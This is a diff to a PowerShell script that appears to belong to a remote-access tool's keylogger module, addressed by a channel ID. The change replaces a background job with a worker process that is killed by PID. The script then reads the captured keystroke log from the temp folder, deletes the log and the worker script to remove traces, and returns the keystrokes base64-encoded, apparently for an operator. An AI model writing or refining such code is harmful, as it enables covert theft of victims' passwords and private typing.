@@ -2,24 +2,24 @@ param($args)
 
 $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
-$jobName = "Keylogger_$channelID"
+$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
+$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"
 
-# Stop and remove the job
-$job = Get-Job -Name $jobName -ErrorAction SilentlyContinue
-if ($job) {
-    Stop-Job $job
-    Remove-Job $job
+# Kill the process
+if (Test-Path $pidFile) {
+    $pidRunning = Get-Content $pidFile
+    Stop-Process -Id $pidRunning -Force -ErrorAction SilentlyContinue
+    Remove-Item $pidFile -Force -ErrorAction SilentlyContinue
 }
 
-# Clean up job ID file
-Remove-Item "$env:TEMP\keylog_job_$channelID.txt" -Force -ErrorAction SilentlyContinue
+# Wait for file to be released
+Start-Sleep -Seconds 2
 
-Start-Sleep -Seconds 1
-
-# Read and return the log file
+# Read and return log file
 if (Test-Path $logFile) {
     $content = Get-Content $logFile -Raw
-    Remove-Item $logFile -Force
+    Remove-Item $logFile -Force -ErrorAction SilentlyContinue
+    Remove-Item $workerScript -Force -ErrorAction SilentlyContinue
     if ($content) {
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
         [System.Convert]::ToBase64String($bytes)
